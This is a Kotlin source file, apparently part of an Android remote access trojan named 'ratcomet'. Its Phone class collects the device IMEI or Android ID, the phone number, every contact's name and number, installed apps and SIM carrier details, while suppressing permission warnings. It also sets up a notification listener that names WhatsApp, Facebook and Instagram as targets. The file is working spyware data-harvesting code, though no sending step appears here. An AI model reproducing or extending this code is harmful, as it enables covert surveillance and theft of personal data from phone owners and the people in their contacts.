package ug.hix.ratcomet

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.ApplicationInfo
import android.os.Build
import android.provider.ContactsContract
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.runBlocking
import ug.hix.ratcomet.model.App
import ug.hix.ratcomet.model.ContactModel
import ug.hix.ratcomet.util.CometUtil
import java.util.*

class Phone(private val mContext: Context) : NotificationListenerService() {
    private val tm = mContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
    private val TAG = javaClass.simpleName


    @SuppressLint("HardwareIds", "MissingPermission")
fun getPhoneDetails() : Triple<String,String,String> {
        val imei = if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) Settings.Secure.getString(mContext.contentResolver, Settings.Secure.ANDROID_ID)
                 else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) tm.imei
                    else try {
            tm.deviceId
        }catch (e: Exception) {
//            Log.d(TAG,"Missing phone_state permission error")
//            get imei from initial saved
            runBlocking(Dispatchers.IO){Repository(mContext).getInitialConn()!!.imei}
        }
        val phoneNumber = tm.line1Number
//        val carrier = tm.simCarrierIdName
        val sw = tm.deviceSoftwareVersion
        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        val deviceName = if (model.toLowerCase(Locale.ROOT).startsWith(manufacturer.toLowerCase(Locale.ROOT))) {
            capitalize(model)
        } else {
            capitalize(manufacturer) + " " + model
        }

//        return "imei: $imei phoneNo: $phoneNumber deviceName: $deviceName model: $model"
        return Triple(imei,phoneNumber,deviceName)

    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
//        TODO("get package name to lien to")
        val packageList = listOf<String>("com.whatsapp","com.facebook","com.instagram","com.")
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }
    @SuppressLint("Range")
    fun contactList() : List<ContactModel> {
        val list = mutableListOf<ContactModel>()
        val phones = mContext.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME+" ASC")
        if (phones != null) {
            while (phones.moveToNext()){
                val name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                val email = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA))
                list.add(ContactModel(
                    phoneNumber = CometUtil.sanitizePhone(phoneNumber),
                    name = name
                ))
            }
            phones.close()
        }
        return list
    }
    @SuppressLint("QueryPermissionsNeeded")
    fun installedApps() : List<App>{
        val list = mContext.packageManager.getInstalledPackages(0)
        val stringList = mutableListOf<String>()
        list.forEach { packageInfo ->
            if(packageInfo.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM == 0) {
                stringList.add(packageInfo.applicationInfo.loadLabel(mContext.packageManager).toString())

            }
        }
        return stringList.map { App(it) }
    }
    @SuppressLint("MissingPermission")
    fun getSimCards() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1 ){
            val sm = mContext.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subscription = sm.activeSubscriptionInfoList
            val simList = subscription.map {
                "phone: ${it.number} carrier: ${it.carrierName} country: ${it.countryIso} "
            }
//            Log.d(TAG,"$simList")
        }
    }
    private fun capitalize(s: String?): String {
        if (s == null || s.isEmpty()) {
            return ""
        }
        val first = s[0]
        return if (Character.isUpperCase(first)) {
            s
        } else {
            Character.toUpperCase(first).toString() + s.substring(1)
        }
    }
}